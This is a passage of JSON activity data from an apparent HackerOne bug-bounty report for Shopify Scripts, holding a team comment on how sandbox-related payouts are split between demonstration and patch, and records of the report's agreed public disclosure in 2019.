applicable for security issues that affect the parts of Shopify Scripts that lie outside the seccomp-bpf sandbox. We generally pay 80% of the maximum payout for a report demonstrating an issue, and the remaining 20% if a valid patch is provided. Demonstrating control of the sandboxed process is not necessary.","markdown_message":"\u003cp\u003eAs noted on our program page, bounty payouts above $1,000 are only applicable for security issues that affect the parts of Shopify Scripts that lie outside the seccomp-bpf sandbox. We generally pay 80% of the maximum payout for a report demonstrating an issue, and the remaining 20% if a valid patch is provided. Demonstrating control of the sandboxed process is not necessary.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-02T13:45:11.878Z","updated_at":"2018-11-02T13:45:11.878Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5717035,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-03T10:30:05.370Z","updated_at":"2019-09-03T10:30:05.370Z","first_to_agree":true,"actor":{"username":"dgaletic","cleared":true,"url":"/dgaletic","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5728044,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-04T13:33:48.246Z","updated_at":"2019-09-04T13:33:48.246Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5728045,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-09-04T13:33:48.316Z","updated_at":"2019-09-04T13:33:48.316Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}